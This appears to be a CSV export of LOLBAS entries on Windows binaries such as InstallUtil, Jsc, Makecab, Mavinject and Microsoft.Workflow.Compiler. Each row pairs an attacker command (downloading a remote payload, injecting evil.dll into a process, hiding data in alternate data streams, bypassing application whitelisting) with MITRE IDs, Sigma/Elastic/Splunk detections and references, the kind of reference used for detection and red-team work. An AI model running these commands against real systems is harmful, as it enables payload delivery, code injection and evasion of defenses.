Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"Installutil.exe","The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies","Oddvar Moe","2018-05-25","InstallUtil.exe https://example.com/payload","It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)","Downloads payload from remote server","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml","https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/, https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12, https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md, https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/, https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/, https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool","Casey Smith (@subtee), Nir Chako (Pentera) (@C_h4ck_0)","http://localhost:4001/lolbas/Binaries/Installutil/"
"Jsc.exe","Binary file used by .NET to compile JavaScript code to .exe or .dll format","Oddvar Moe","2019-05-31","jsc.exe scriptfile.js","Use jsc.exe to compile JavaScript code stored in scriptfile.js and output scriptfile.exe.","Compile attacker code on system. Bypass defensive counter measures.","Compile","User","T1127","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Jsc.exe, C:\Windows\Microsoft.NET\Framework\v2.0.50727\Jsc.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Jsc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_jsc.yml, IOC: Jsc.exe should normally not run a system unless it is used for development.","https://twitter.com/DissectMalware/status/998797808907046913, https://www.phpied.com/make-your-javascript-a-windows-exe/","Malwrologist (@DissectMalware)","http://localhost:4001/lolbas/Binaries/Jsc/"
"Jsc.exe","Binary file used by .NET to compile JavaScript code to .exe or .dll format","Oddvar Moe","2019-05-31","jsc.exe /t:library Library.js","Use jsc.exe to compile JavaScript code stored in Library.js and output Library.dll.","Compile attacker code on system. Bypass defensive counter measures.","Compile","User","T1127","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Jsc.exe, C:\Windows\Microsoft.NET\Framework\v2.0.50727\Jsc.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Jsc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_jsc.yml, IOC: Jsc.exe should normally not run a system unless it is used for development.","https://twitter.com/DissectMalware/status/998797808907046913, https://www.phpied.com/make-your-javascript-a-windows-exe/","Malwrologist (@DissectMalware)","http://localhost:4001/lolbas/Binaries/Jsc/"
"Ldifde.exe","Creates, modifies, and deletes LDAP directory objects.","Grzegorz Tworek","2022-08-31","Ldifde -i -f inputfile.ldf","Import inputfile.ldf into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder.","Download file from Internet","Download","Administrator","T1105","Windows Server with AD Domain Services role,  Windows 10 with AD LDS role.","c:\windows\system32\ldifde.exe, c:\windows\syswow64\ldifde.exe","IOC: , Analysis: , Sigma: , Elastic: , Splunk: , BlockRule: ","https://twitter.com/0gtweet/status/1564968845726580736","Grzegorz Tworek (@0gtweet)","http://localhost:4001/lolbas/Binaries/Ldifde/"
"Makecab.exe","Binary to package existing files into a cabinet (.cab) file","Oddvar Moe","2018-05-25","makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab","Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.","Hide data compressed into an alternate data stream","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\makecab.exe, C:\Windows\SysWOW64\makecab.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml, IOC: Makecab retrieving files from Internet, IOC: Makecab storing data into alternate data streams","https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Makecab/"
"Makecab.exe","Binary to package existing files into a cabinet (.cab) file","Oddvar Moe","2018-05-25","makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab","Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.","Hide data compressed into an alternate data stream","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\makecab.exe, C:\Windows\SysWOW64\makecab.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml, IOC: Makecab retrieving files from Internet, IOC: Makecab storing data into alternate data streams","https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Makecab/"
"Makecab.exe","Binary to package existing files into a cabinet (.cab) file","Oddvar Moe","2018-05-25","makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab","Download and compresses the target file and stores it in the target file.","Download file and compress into a cab file","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\makecab.exe, C:\Windows\SysWOW64\makecab.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml, IOC: Makecab retrieving files from Internet, IOC: Makecab storing data into alternate data streams","https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Makecab/"
"Mavinject.exe","Used by App-v in Windows","Oddvar Moe","2018-05-25","MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll","Inject evil.dll into a process with PID 3110.","Inject dll file into running process","Execute","User","T1218.013","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\mavinject.exe, C:\Windows\SysWOW64\mavinject.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_mavinject_proc_inj.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/c44b22b52fce406d45ddb6743a02b9ff8c62c7c6/rules/windows/process_creation/sysmon_creation_mavinject_dll.yml, IOC: mavinject.exe should not run unless APP-v is in use on the workstation","https://twitter.com/gN3mes1s/status/941315826107510784, https://twitter.com/Hexcorn/status/776122138063409152, https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/","Giuseppe N3mes1s (@gN3mes1s), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Mavinject/"
"Mavinject.exe","Used by App-v in Windows","Oddvar Moe","2018-05-25","Mavinject.exe 4172 /INJECTRUNNING ""c:\ads\file.txt:file.dll""","Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172","Inject dll file into running process","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\mavinject.exe, C:\Windows\SysWOW64\mavinject.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_mavinject_proc_inj.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/c44b22b52fce406d45ddb6743a02b9ff8c62c7c6/rules/windows/process_creation/sysmon_creation_mavinject_dll.yml, IOC: mavinject.exe should not run unless APP-v is in use on the workstation","https://twitter.com/gN3mes1s/status/941315826107510784, https://twitter.com/Hexcorn/status/776122138063409152, https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/","Giuseppe N3mes1s (@gN3mes1s), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Mavinject/"
"Microsoft.Workflow.Compiler.exe","A utility included with .NET that is capable of compiling and executing C# or VB.net code.","Conor Richard","2018-10-22","Microsoft.Workflow.Compiler.exe tests.xml results.xml","Compile and execute C# or VB.net code in a XOML file referenced in the test.xml file.","Compile and run code","Execute","User","T1127","Windows 10S, Windows 11","C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/85d47aeabc25bbd023284849f4466c1e00b855ce/rules/windows/process_creation/win_workflow_compiler.yml, Splunk: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/suspicious_microsoft_workflow_compiler_usage.yml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_microsoft_workflow_compiler_rename.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Microsoft.Workflow.Compiler.exe would not normally be run on workstations., IOC: The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe, IOC: Presence of ""<CompilerInput"" in a text file.","https://twitter.com/mattifestation/status/1030445200475185154, https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb, https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba#file-workflowcompilerdetectiontests-ps1, https://gist.github.com/mattifestation/7ba8fc8f724600a9f525714c9cf767fd#file-createcompilerinputxml-ps1, https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks, https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/, https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15","Matt Graeber (@mattifestation), John Bergbom (@BergbomJohn), FortyNorth Security (@FortyNorthSec), Bank Security (@Bank_Security)","http://localhost:4001/lolbas/Binaries/Microsoft.Workflow.Compiler/"
"Microsoft.Workflow.Compiler.exe","A utility included with .NET that is capable of compiling and executing C# or VB.net code.","Conor Richard","2018-10-22","Microsoft.Workflow.Compiler.exe tests.txt results.txt","Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.","Compile and run code","Execute","User","T1127","Windows 10S, Windows 11","C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/85d47aeabc25bbd023284849f4466c1e00b855ce/rules/windows/process_creation/win_workflow_compiler.yml, Splunk: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/suspicious_microsoft_workflow_compiler_usage.yml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_microsoft_workflow_compiler_rename.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Microsoft.Workflow.Compiler.exe would not normally be run on workstations., IOC: The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe, IOC: Presence of ""<CompilerInput"" in a text file.","https://twitter.com/mattifestation/status/1030445200475185154, https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb, https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba#file-workflowcompilerdetectiontests-ps1, https://gist.github.com/mattifestation/7ba8fc8f724600a9f525714c9cf767fd#file-createcompilerinputxml-ps1, https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks, https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/, https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15","Matt Graeber (@mattifestation), John Bergbom (@BergbomJohn), FortyNorth Security (@FortyNorthSec), Bank Security (@Bank_Security)","http://localhost:4001/lolbas/Binaries/Microsoft.Workflow.Compiler/"
"Microsoft.Workflow.Compiler.exe","A utility included with .NET that is capable of compiling and executing C# or VB.net code.","Conor Richard","2018-10-22","Microsoft.Workflow.Compiler.exe tests.txt results.txt","Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.","Compile and run code","AWL Bypass","User","T1127","Windows 10S, Windows 11","C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/85d47aeabc25bbd023284849f4466c1e00b855ce/rules/windows/process_creation/win_workflow_compiler.yml, Splunk: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/suspicious_microsoft_workflow_compiler_usage.yml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_microsoft_workflow_compiler_rename.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Microsoft.Workflow.Compiler.exe would not normally be run on workstations., IOC: The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe, IOC: Presence of ""<CompilerInput"" in a text file.","https://twitter.com/mattifestation/status/1030445200475185154, https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb, https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba#file-workflowcompilerdetectiontests-ps1, https://gist.github.com/mattifestation/7ba8fc8f724600a9f525714c9cf767fd#file-createcompilerinputxml-ps1, https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks, https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/, https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15","Matt Graeber (@mattifestation), John Bergbom (@BergbomJohn), FortyNorth Security (@FortyNorthSec), Bank Security (@Bank_Security)","http://localhost:4001/lolbas/Binaries/Microsoft.Workflow.Compiler/"
